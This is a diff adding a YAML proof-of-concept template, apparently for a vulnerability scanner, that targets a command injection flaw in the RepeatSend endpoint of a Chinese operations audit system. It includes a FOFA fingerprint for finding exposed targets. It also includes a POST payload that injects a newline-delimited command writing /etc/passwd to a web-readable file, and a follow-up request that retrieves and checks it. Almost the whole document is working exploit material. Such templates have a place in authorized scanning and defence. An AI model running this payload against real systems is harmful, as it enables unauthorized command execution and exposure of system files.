@@ -1,0 +1,22 @@
+id: poc-yaml-suninfo-ommas-repeatsend-command-injection
+info:
+  name: 上讯信息运维管理审计系统 RepeatSend 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: 上讯信息运维管理审计系统
+  fofa: body="default/getloginhtml"
+variables:
+  t1: random_str(4)
+requests:
+- method: POST
+  path: /emailapply/RepeatSend
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: id='%0acat /etc/passwd > {{.t1}}.txt%0a'
+  expression: status_code == 200 && contains(body,"error") && !contains(body,"<")
+- method: GET
+  path: /{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
